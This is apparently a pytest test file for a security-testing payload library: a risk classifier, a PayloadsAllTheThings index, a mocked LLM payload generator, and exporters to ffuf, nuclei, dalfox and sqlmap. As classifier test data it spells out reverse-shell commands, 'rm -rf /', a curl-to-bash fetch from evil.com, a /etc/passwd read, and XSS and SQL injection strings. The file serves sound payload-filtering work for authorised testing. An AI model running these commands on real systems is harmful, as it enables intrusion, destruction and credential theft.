"""Tests for the PayloadEngine module.

Covers: PayloadSet, RiskLevel, classify_risk, PATT index, PayloadEngine,
PayloadGenerator (mocked), and PayloadInjector.

⚠️ Contenu généré par IA — validation humaine requise avant utilisation.
"""

from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from payloads import PayloadSet, RiskLevel, classify_risk
from payloads.index import (
    CATEGORY_CWE_MAP,
    PATT_ROOT,
    build_index,
    get_categories_for_cwe,
    get_cwe_for_category,
    patt_age_days,
)
from payloads.engine import PayloadEngine
from payloads.injector import PayloadInjector


# ── classify_risk ──────────────────────────────────────────


class TestClassifyRisk:
    def test_high_reverse_shell(self):
        assert classify_risk("nc -e /bin/bash 10.0.0.1 4444") == RiskLevel.HIGH

    def test_high_bash_reverse(self):
        assert classify_risk("bash -i >& /dev/tcp/10.0.0.1/4444") == RiskLevel.HIGH

    def test_high_rm_rf(self):
        assert classify_risk("rm -rf /") == RiskLevel.HIGH

    def test_high_curl_pipe_bash(self):
        assert classify_risk("curl http://evil.com/x.sh | bash") == RiskLevel.HIGH

    def test_high_etc_passwd(self):
        assert classify_risk("cat /etc/passwd") == RiskLevel.HIGH

    def test_medium_alert(self):
        assert classify_risk("<script>alert(1)</script>") == RiskLevel.MEDIUM

    def test_medium_onerror(self):
        assert classify_risk('<img onerror="alert(1)">') == RiskLevel.MEDIUM

    def test_medium_eval(self):
        assert classify_risk("eval('code')") == RiskLevel.MEDIUM

    def test_medium_union_select(self):
        assert classify_risk("' UNION SELECT 1,2,3--") == RiskLevel.MEDIUM

    def test_medium_path_traversal(self):
        assert classify_risk("../../etc/hosts") == RiskLevel.MEDIUM

    def test_low_benign(self):
        assert classify_risk("test_parameter_value") == RiskLevel.LOW

    def test_low_empty(self):
        assert classify_risk("") == RiskLevel.LOW


# ── PayloadSet ─────────────────────────────────────────────


class TestPayloadSet:
    def _make_set(self):
        return PayloadSet(
            name="test",
            category="XSS Injection",
            cwe="CWE-79",
            source="curated",
            risk_level=RiskLevel.HIGH,
            payloads=[
                '<script>alert(1)</script>',           # MEDIUM
                'nc -e /bin/bash 10.0.0.1 4444',       # HIGH
                'test_value',                           # LOW
            ],
            file_path="/tmp/test.txt",
            tags=["xss"],
        )

    def test_count(self):
        ps = self._make_set()
        assert ps.count == 3

    def test_len(self):
        ps = self._make_set()
        assert len(ps) == 3

    def test_iter(self):
        ps = self._make_set()
        assert list(ps) == ps.payloads

    def test_safe_only_removes_high(self):
        ps = self._make_set()
        safe = ps.safe_only()
        assert len(safe) == 2
        assert all(classify_risk(p) != RiskLevel.HIGH for p in safe.payloads)

    def test_safe_only_preserves_source(self):
        ps = self._make_set()
        safe = ps.safe_only()
        assert safe.source == "curated"
        assert safe.cwe == "CWE-79"

    def test_filter_by_risk_low(self):
        ps = self._make_set()
        low_only = ps.filter_by_risk(RiskLevel.LOW)
        assert len(low_only) == 1
        assert low_only.payloads == ['test_value']

    def test_filter_by_risk_medium(self):
        ps = self._make_set()
        med = ps.filter_by_risk(RiskLevel.MEDIUM)
        assert len(med) == 2

    def test_filter_by_risk_high_keeps_all(self):
        ps = self._make_set()
        high = ps.filter_by_risk(RiskLevel.HIGH)
        assert len(high) == 3

    def test_repr(self):
        ps = self._make_set()
        r = repr(ps)
        assert "test" in r
        assert "CWE-79" in r

    def test_empty_payloadset(self):
        ps = PayloadSet(name="empty", category="none")
        assert ps.count == 0
        safe = ps.safe_only()
        assert safe.count == 0


# ── PATT Index ─────────────────────────────────────────────


class TestPATTIndex:
    def test_patt_root_exists(self):
        assert PATT_ROOT.exists(), "PATT submodule not checked out"

    def test_category_cwe_map_not_empty(self):
        assert len(CATEGORY_CWE_MAP) >= 50

    def test_known_mappings(self):
        assert CATEGORY_CWE_MAP["XSS Injection"] == "CWE-79"
        assert CATEGORY_CWE_MAP["SQL Injection"] == "CWE-89"
        assert CATEGORY_CWE_MAP["Command Injection"] == "CWE-78"

    def test_build_index_returns_dict(self):
        idx = build_index()
        assert isinstance(idx, dict)
        assert "categories" in idx
        assert "stats" in idx

    def test_build_index_has_categories(self):
        idx = build_index()
        assert len(idx["categories"]) > 0

    def test_build_index_stats(self):
        idx = build_index()
        stats = idx["stats"]
        assert stats["total_categories"] > 0
        assert stats["total_payloads"] > 0

    def test_get_categories_for_cwe_79(self):
        cats = get_categories_for_cwe("CWE-79")
        assert len(cats) >= 1
        assert "XSS Injection" in cats

    def test_get_categories_for_cwe_unknown(self):
        cats = get_categories_for_cwe("CWE-99999")
        assert cats == []

    def test_get_cwe_for_category(self):
        cwe = get_cwe_for_category("SQL Injection")
        assert cwe == "CWE-89"

    def test_patt_age_days(self):
        age = patt_age_days()
        assert age is None or age >= 0

    def test_build_index_cached(self):
        """Second call should use cache (faster)."""
        idx1 = build_index()
        idx2 = build_index()
        assert idx1["stats"] == idx2["stats"]


# ── PayloadEngine ──────────────────────────────────────────


class TestPayloadEngine:
    def test_init_default(self):
        engine = PayloadEngine()
        assert engine.max_risk == RiskLevel.MEDIUM

    def test_init_include_high(self):
        engine = PayloadEngine(include_high=True)
        assert engine.max_risk == RiskLevel.HIGH

    def test_stats(self):
        engine = PayloadEngine()
        s = engine.stats()
        assert "patt_categories" in s
        assert "patt_payloads" in s
        assert "patt_stale" in s
        assert isinstance(s["patt_stale"], bool)

    def test_all_categories(self):
        engine = PayloadEngine()
        cats = engine.all_categories()
        assert len(cats) > 0

    def test_get_payloads_xss(self):
        engine = PayloadEngine()
        results = engine.get_payloads("XSS Injection")
        assert len(results) >= 0  # may be 0 if no payload files in that dir

    def test_get_payloads_for_cwe_89(self):
        engine = PayloadEngine()
        results = engine.get_payloads_for_cwe("CWE-89")
        # SQL injection is one of the richest categories
        total = sum(ps.count for ps in results)
        assert total > 0, "Expected SQLi payloads from PATT"

    def test_get_payloads_for_cwe_unknown(self):
        engine = PayloadEngine()
        results = engine.get_payloads_for_cwe("CWE-99999")
        assert results == []

    def test_search(self):
        engine = PayloadEngine()
        results = engine.search("xss")
        assert isinstance(results, list)

    def test_default_filter_no_high(self):
        """Default engine should not return HIGH-risk payloads."""
        engine = PayloadEngine(include_high=False)
        results = engine.get_payloads_for_cwe("CWE-78")  # Command Injection
        for ps in results:
            for p in ps.payloads:
                assert classify_risk(p) != RiskLevel.HIGH, f"HIGH payload leaked: {p}"

    def test_include_high_allows_dangerous(self):
        """With include_high=True, HIGH payloads should be present."""
        engine = PayloadEngine(include_high=True)
        results = engine.get_payloads_for_cwe("CWE-78")
        all_payloads = [p for ps in results for p in ps.payloads]
        # Command Injection PATT should have at least some HIGH-risk payloads
        if all_payloads:
            risks = {classify_risk(p) for p in all_payloads}
            # Just verify it returns payloads — HIGH presence depends on PATT content
            assert len(all_payloads) > 0

    def test_rebuild_index(self):
        engine = PayloadEngine()
        idx = engine.rebuild_index()
        assert "categories" in idx


# ── PayloadGenerator (mocked) ─────────────────────────────


class TestPayloadGenerator:
    def test_generate_returns_payloadset(self):
        """Generator with mocked LLM should return a PayloadSet."""
        from payloads.generator import PayloadGenerator
        import payloads.generator as gen_mod

        gen = PayloadGenerator()
        mock_llm = MagicMock()
        mock_llm.simple_chat.return_value = "<script>alert(1)</script>\n' OR 1=1--\ntest"

        with patch.object(gen_mod, '_get_llm', return_value=mock_llm):
            result = gen.generate("XSS Injection", extra_context="search parameter")

        assert result is not None
        assert isinstance(result, PayloadSet)
        assert result.count > 0

    def test_adapt_payload(self):
        from payloads.generator import PayloadGenerator
        import payloads.generator as gen_mod

        gen = PayloadGenerator()
        mock_llm = MagicMock()
        mock_llm.simple_chat.return_value = '<img src=x onerror=alert(1)>\n<svg onload=alert(1)>'

        with patch.object(gen_mod, '_get_llm', return_value=mock_llm):
            results = gen.adapt_payload(
                "<script>alert(1)</script>",
                extra_context="WAF blocks script tags",
            )

        assert isinstance(results, list)

    def test_suggest_categories(self):
        from payloads.generator import PayloadGenerator
        import payloads.generator as gen_mod

        gen = PayloadGenerator()
        mock_llm = MagicMock()
        mock_llm.simple_chat.return_value = json.dumps([
            {"category": "XSS Injection", "reason": "input found", "priority": 5},
            {"category": "SQL Injection", "reason": "db backend", "priority": 4},
        ])

        with patch.object(gen_mod, '_get_llm', return_value=mock_llm):
            results = gen.suggest_categories([{"cwe": "CWE-79", "title": "XSS"}])

        assert isinstance(results, list)

    def test_high_risk_filter(self):
        """Generator with max_risk=MEDIUM should filter HIGH payloads."""
        from payloads.generator import PayloadGenerator
        import payloads.generator as gen_mod

        gen = PayloadGenerator(max_risk=RiskLevel.MEDIUM)
        mock_llm = MagicMock()
        mock_llm.simple_chat.return_value = (
            "nc -e /bin/bash 10.0.0.1 4444\n"  # HIGH
            "<script>alert(1)</script>\n"  # MEDIUM
            "test_value"  # LOW
        )

        with patch.object(gen_mod, '_get_llm', return_value=mock_llm):
            result = gen.generate("Command Injection")

        assert result is not None
        assert all(classify_risk(p) != RiskLevel.HIGH for p in result.payloads)


# ── PayloadInjector ────────────────────────────────────────


class TestPayloadInjector:
    def _sample_sets(self):
        return {
            "ffuf": [
                PayloadSet(
                    name="dirs",
                    category="fuzzing",
                    payloads=["admin", "backup", ".git", "wp-admin"],
                    tags=["fuzzing"],
                )
            ],
            "nuclei": [
                PayloadSet(
                    name="xss",
                    category="XSS Injection",
                    cwe="CWE-79",
                    payloads=["<script>alert(1)</script>", "{{7*7}}"],
                    tags=["xss"],
                )
            ],
            "dalfox": [
                PayloadSet(
                    name="blind",
                    category="XSS Injection",
                    payloads=["<img src=x>", "<svg onload=x>"],
                    tags=["xss"],
                )
            ],
            "sqlmap": [
                PayloadSet(
                    name="sqli",
                    category="SQL Injection",
                    cwe="CWE-89",
                    payloads=["' OR 1=1--", "1 UNION SELECT NULL--"],
                    tags=["sqli"],
                )
            ],
        }

    def test_inject_creates_files(self, tmp_path):
        injector = PayloadInjector(output_dir=tmp_path)
        files = injector.inject(self._sample_sets())

        assert "ffuf" in files
        assert "nuclei" in files
        assert "dalfox" in files
        assert "sqlmap" in files

    def test_ffuf_wordlist(self, tmp_path):
        injector = PayloadInjector(output_dir=tmp_path)
        files = injector.inject({"ffuf": self._sample_sets()["ffuf"]})

        assert len(files["ffuf"]) == 1
        content = files["ffuf"][0].read_text()
        assert "admin" in content
        assert "wp-admin" in content

    def test_nuclei_template(self, tmp_path):
        injector = PayloadInjector(output_dir=tmp_path)
        files = injector.inject({"nuclei": self._sample_sets()["nuclei"]})

        assert len(files["nuclei"]) == 2
        # Should have both a wordlist and a YAML template
        extensions = {f.suffix for f in files["nuclei"]}
        assert ".txt" in extensions
        assert ".yaml" in extensions

        yaml_file = [f for f in files["nuclei"] if f.suffix == ".yaml"][0]
        content = yaml_file.read_text()
        assert "patt-" in content
        assert "PayloadEngine" in content

    def test_dalfox_custom_payloads(self, tmp_path):
        injector = PayloadInjector(output_dir=tmp_path)
        files = injector.inject({"dalfox": self._sample_sets()["dalfox"]})

        assert len(files["dalfox"]) == 1
        assert files["dalfox"][0].name == "custom-payloads.txt"

    def test_sqlmap_tamper_script(self, tmp_path):
        injector = PayloadInjector(output_dir=tmp_path)
        files = injector.inject({"sqlmap": self._sample_sets()["sqlmap"]})

        assert len(files["sqlmap"]) == 2
        tamper = [f for f in files["sqlmap"] if f.name == "patt_tamper.py"][0]
        content = tamper.read_text()
        assert "def tamper" in content
        assert "_PATT_PAYLOADS" in content

    def test_inject_empty(self, tmp_path):
        injector = PayloadInjector(output_dir=tmp_path)
        files = injector.inject({})
        assert files == {}

    def test_inject_empty_payloads(self, tmp_path):
        injector = PayloadInjector(output_dir=tmp_path)
        files = injector.inject({"ffuf": [PayloadSet(name="e", category="e")]})
        assert "ffuf" not in files  # empty payloads → skipped

    def test_inject_from_strings(self, tmp_path):
        injector = PayloadInjector(output_dir=tmp_path)
        files = injector.inject_from_strings({
            "xss-scanner": ["<script>alert(1)</script>", "test"],
        })
        assert "xss-scanner" in files
        content = files["xss-scanner"][0].read_text()
        assert "<script>alert(1)</script>" in content

    def test_deduplication(self, tmp_path):
        injector = PayloadInjector(output_dir=tmp_path)
        dup_sets = {
            "ffuf": [
                PayloadSet(name="a", category="a", payloads=["dup", "dup", "unique"]),
                PayloadSet(name="b", category="b", payloads=["dup", "other"]),
            ]
        }
        files = injector.inject(dup_sets)
        content = files["ffuf"][0].read_text().strip().split("\n")
        assert content == ["dup", "unique", "other"]  # deduplicated, order preserved


# ── Integration (Engine → Injector) ───────────────────────


class TestEngineInjectorIntegration:
    def test_cwe_to_injected_files(self, tmp_path):
        """Full pipeline: CWE → payloads → scanner files."""
        engine = PayloadEngine()
        injector = PayloadInjector(output_dir=tmp_path)

        # Get SQL injection payloads
        payload_sets = engine.get_payloads_for_cwe("CWE-89")

        if payload_sets:
            files = injector.inject({"sqlmap": payload_sets})
            assert "sqlmap" in files
            assert len(files["sqlmap"]) > 0
